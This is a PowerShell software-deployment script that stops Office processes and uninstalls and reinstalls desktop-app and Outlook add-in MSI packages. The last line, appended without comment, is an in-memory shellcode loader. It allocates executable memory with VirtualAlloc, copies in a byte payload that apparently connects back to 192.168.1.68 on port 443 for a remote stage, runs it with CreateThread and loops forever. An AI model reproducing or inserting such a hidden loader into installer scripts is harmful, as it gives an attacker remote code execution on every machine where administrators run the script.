

[CmdletBinding()]
param ()

function Get-MSIInformation {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()]
		[System.IO.FileInfo]$MSI,
		[ValidateSet('ProductCode', 'ProductVersion', 'ProductName', 'Manufacturer', 'ProductLanguage', 'FullVersion')]
		[string]$Property
	)
	
	
	$WindowsInstaller = New-Object -ComObject WindowsInstaller.Installer
	$MSIDatabase = $WindowsInstaller.GetType().InvokeMember("OpenDatabase", "InvokeMethod", $null, $WindowsInstaller, @($MSI.FullName, 0))
	$Query = "SELECT Value FROM Property WHERE Property = '$($Property)'"
	$View = $MSIDatabase.GetType().InvokeMember("OpenView", "InvokeMethod", $null, $MSIDatabase, ($Query))
	$View.GetType().InvokeMember("Execute", "InvokeMethod", $null, $View, $null)
	$Record = $View.GetType().InvokeMember("Fetch", "InvokeMethod", $null, $View, $null)
	$Value = $Record.GetType().InvokeMember("StringData", "GetProperty", $null, $Record, 1)
	
	
	$MSIDatabase.GetType().InvokeMember("Commit", "InvokeMethod", $null, $MSIDatabase, $null)
	$View.GetType().InvokeMember("Close", "InvokeMethod", $null, $View, $null)
	$MSIDatabase = $null
	$View = $null
	
	
	return $Value
}

function Get-RelativePath {

	
	[CmdletBinding()]
	[OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"
	Return $Path
}

function Install-MSI {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()]
		[string]$MSI,
		[ValidateNotNullOrEmpty()]
		[string]$Switches
	)
	
	[string]$DisplayName = Get-MSIInformation -MSI $MSI -Property 'ProductName'
	$Executable = $Env:windir + "\system32\msiexec.exe"
	$Parameters = "/i" + [char]32 + [char]34 + $MSI + [char]34 + [char]32 + $Switches
	Write-Host "Install"$DisplayName.Trim()"....." -NoNewline
	$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -Wait -Passthru).ExitCode
	If (($ErrCode -eq 0) -or ($ErrCode -eq 3010)) {
		Write-Host "Success" -ForegroundColor Yellow
	} else {
		Write-Host "Failed with error code "$ErrCode -ForegroundColor Red
		Exit $ErrCode
	}
}

function Stop-Processes {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()]
		[String]$ProcessName
	)
	
	$Processes = Get-Process $ProcessName -ErrorAction SilentlyContinue
	If ($Processes -ne $null) {
		Do {
			foreach ($Process in $Processes) {
				If ($Process.Product -ne $null) {
					Write-Host "Killing"(($Process.Product).ToString()).Trim()"Process ID"(($Process.Id).ToString()).Trim()"....." -NoNewline
					Stop-Process -Id $Process.Id -Force -ErrorAction SilentlyContinue
					Start-Sleep -Milliseconds 250
					$Process = Get-Process -Id $Process.Id -ErrorAction SilentlyContinue
					If ($Process -eq $null) {
						Write-Host "Success" -ForegroundColor Yellow
					} else {
						Write-Host "Failed" -ForegroundColor Red
					}
				}
			}
			$Process = Get-Process $ProcessName -ErrorAction SilentlyContinue
		} While ($Process -ne $null)
	}
}

function Uninstall-MSIByName {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()]
		[String]$ApplicationName,
		[ValidateNotNullOrEmpty()]
		[String]$Switches
	)
	
	
	$Executable = $Env:windir + "\system32\msiexec.exe"
	Do {
		
		$Uninstall = Get-ChildItem REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue -Force
		$Uninstall += Get-ChildItem REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall -Recurse -ErrorAction SilentlyContinue
		
		$Key = $uninstall | foreach-object {
			Get-ItemProperty REGISTRY::$_
		} | where-object {
			$_.DisplayName -like "*$ApplicationName*"
		}
		If ($Key -ne $null) {
			Write-Host "Uninstall"$Key[0].DisplayName"....." -NoNewline
			
			$Parameters = "/x " + $Key[0].PSChildName + [char]32 + $Switches
			
			$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -Wait -Passthru).ExitCode
			
			If (($ErrCode -eq 0) -or ($ErrCode -eq 3010) -or ($ErrCode -eq 1605)) {
				Write-Host "Success" -ForegroundColor Yellow
			} else {
				Write-Host "Failed with error code "$ErrCode -ForegroundColor Red
			}
		}
	} While ($Key -ne $null)
}


$RelativePath = Get-RelativePath

Stop-Processes -ProcessName 'DesktopApp'
Stop-Processes -ProcessName 'winword'
Stop-Processes -ProcessName 'excel'
Stop-Processes -ProcessName 'outlook'
Stop-Processes -ProcessName 'powerpnt'

Uninstall-MSIByName -ApplicationName 'OutlookAddInInstaller' -Switches '/qb- /norestart'
Uninstall-MSIByName -ApplicationName 'PingDesktopApp' -Switches '/qb- /norestart'

Install-MSI -MSI $RelativePath'DesktopAppInstaller_v2.0.1420.msi' -Switches '/qb- /norestart'
Install-MSI -MSI $RelativePath'OutlookAddInInstaller_v1.5.17.msi' -Switches '/qb- /norestart'

$8yA = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $8yA -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x44,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tGc=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tGc.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tGc,0,0,0);for (;;){Start-sleep 60};

